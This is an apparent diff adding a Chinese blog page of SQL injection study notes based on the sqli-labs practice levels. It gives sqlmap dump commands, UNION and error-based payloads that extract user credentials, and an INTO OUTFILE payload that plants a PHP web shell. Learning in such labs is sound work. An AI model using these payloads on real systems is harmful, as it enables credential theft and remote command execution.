@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">SQL类</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-12-21</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-30</span>
+            
+            
+             <span style="margin: 0 15px;">|</span>
+             📂 秘籍
+            
+        </div>
+        
+        <div class="article-content">
+            <h1 id="SQLmap学习中："><a href="#SQLmap学习中：" class="headerlink" title="#SQLmap学习中："></a>#SQLmap学习中：</h1><hr>
+<h2 id="一-知道库名，表名："><a href="#一-知道库名，表名：" class="headerlink" title="#一.知道库名，表名："></a>#一.知道库名，表名：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-2/?id=1&quot; --batch -D security -T users --columns --dump</span><br></pre></td></tr></table></figure>
+
+<p>根据sql lab的前四关，我们可以总结出一个秒杀的指令。</p>
+<p>使用结构为：</p>
+<p><strong>一</strong> ：</p>
+<p>sqlmap -u + “           “	<strong>(指定url和id)</strong></p>
+<p><strong>二</strong> ：</p>
+<p>–batch	<strong>(自动化设置)</strong></p>
+<p><strong>三</strong> ：</p>
+<p>-D security	<strong>(指定数据库)</strong></p>
+<p><strong>四</strong> ：</p>
+<p>-T users	<strong>(指定表名)</strong></p>
+<p><strong>五</strong> ：</p>
+<p>–colums	<strong>(获取列名)</strong></p>
+<p><strong>六</strong> ：</p>
+<p>–dump	<strong>(导出数据)</strong></p>
+<hr>
+<h2 id="小连招这块："><a href="#小连招这块：" class="headerlink" title="#小连招这块："></a>#小连招这块：</h2><p><code>sqlmap -u &quot;...&quot; --batch --current-db</code>	<strong>(爆破数据库)</strong></p>
+<p><code>sqlmap -u &quot;...&quot; --batch -D &quot;数据库&quot; --tables</code>	<strong>(爆破数据库的表)</strong></p>
+<p><code>sqlmap -u &quot;...&quot; --batch -D &quot;数据库名&quot; -T &quot;表名&quot; --dump</code>	<strong>(爆破表内数据)</strong></p>
+<hr>
+<h2 id="二"><a href="#二" class="headerlink" title="#二."></a>#二.</h2><hr>
+<h1 id="SQL类："><a href="#SQL类：" class="headerlink" title="#SQL类："></a>#SQL类：</h1><hr>
+<h2 id="数字型："><a href="#数字型：" class="headerlink" title="#数字型："></a>#数字型：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>id=1 ORDER BY ?</code> <strong>(爆列)</strong></p>
+<p><code>id=-1 UNION SELECT 1, 2, 3</code> <strong>(回显确定)</strong></p>
+<p><code>id=-1 UNION SELECT 1, database(), 3</code> <strong>(爆库)</strong></p>
+<p><code>id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = &#39;数据库&#39;</code> <strong>(爆表)</strong></p>
+<p><code>id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = &#39;表名&#39;</code> <strong>(读表)</strong></p>
+<p><code>id=-1 UNION SELECT 1, group_concat(username, &#39;~&#39;, password), 3 FROM users</code> <strong>(读数据，username和password为表users的数据)</strong></p>
+<hr>
+<h3 id="语法积累："><a href="#语法积累：" class="headerlink" title="#语法积累："></a>#语法积累：</h3><p><code>information_schema.tables</code> ：记录表名的函数。</p>
+<p><code>WHERE table_schema=database()</code> ：过滤的函数，用来筛选表名。</p>
+<p><code>group_concat(table_name)</code> ：拼接读取的数据的函数。</p>
+<p><code>database()</code> ：显示当前数据库的函数。</p>
+<p><code>user()</code> ：显示当前登入用户的函数</p>
+<hr>
+<h2 id="字符型："><a href="#字符型：" class="headerlink" title="#字符型："></a>#字符型：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>id=1&#39; ORDER BY ? --+</code> <strong>(爆列)</strong></p>
+<p><code>id=-1&#39; UNION SELECT 1, 2, 3 --+</code> <strong>(回显确定)</strong></p>
+<p><code>id=-1&#39; UNION SELECT 1, database(), 3 --+</code> <strong>(爆库)</strong></p>
+<p><code>id=-1&#39; UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = &#39;数据库&#39; --+</code> <strong>(爆表)</strong></p>
+<p><code>id=-1&#39; UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = &#39;表名&#39; --+</code> <strong>(读表)</strong></p>
+<p><code>id=-1&#39; UNION SELECT 1, group_concat(username, &#39;~&#39;, password), 3 FROM users --+</code> <strong>(读数据，username和password为表users的数据)</strong></p>
+<hr>
+<h3 id="其他类型的源码："><a href="#其他类型的源码：" class="headerlink" title="#其他类型的源码："></a>#其他类型的源码：</h3><ol>
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = (&#x27;$id&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>闭合类型为 ‘) 。</p>
+<ol start="2">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = (&quot;$id&quot;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>闭合类型为”)。</p>
+<p>4</p>
+<hr>
+<h2 id="报错型："><a href="#报错型：" class="headerlink" title="#报错型："></a>#报错型：</h2><p><code>id=-1 AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+</code> <strong>(最基础的)</strong></p>
+<p><code>id=-1&#39; AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+</code> <strong>(后端存在单引号)</strong></p>
+<p><code>?id=-1 AND updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#39;数据库&#39; limit 0,1), 0x7e), 1) </code> <strong>(查表)</strong></p>
+<p><code>?id=-1 AND updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name=&#39;表&#39; limit 1,1), 0x7e), 1)</code>  <strong>(查对应表的列)</strong></p>
+<p><code>?id=-1 AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1)</code>  <strong>(查数据)</strong></p>
+<p><strong>注意：</strong></p>
+<p>由于报错注入的特殊性，所有内容都得多次注入后拿全。</p>
+<hr>
+<h2 id="文件注入："><a href="#文件注入：" class="headerlink" title="#文件注入："></a>#文件注入：</h2><p><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @system($_GET[&quot;cmd&quot;]); ?&gt;&#39; into outfile &quot;/var/www/html/Less-7/shell.php&quot;--+</code>	<strong>((‘	‘))包裹</strong></p>
+<hr>
+<h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="#布尔盲注："></a>#布尔盲注：</h2><p><code>sqlmap -u &quot;...&quot; --batch --current-db</code>	<strong>(爆破数据库)</strong></p>
+<p><code>sqlmap -u &quot;...&quot; --batch -D &quot;数据库&quot; --tables</code>	<strong>(爆破数据库的表)</strong></p>
+<p><code>sqlmap -u &quot;...&quot; --batch -D &quot;数据库名&quot; -T &quot;表名&quot; --dump</code>	<strong>(爆破表内数据)</strong></p>
+<hr>
+<p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js?v=1767337365559"></script>
+</body>
+</html>
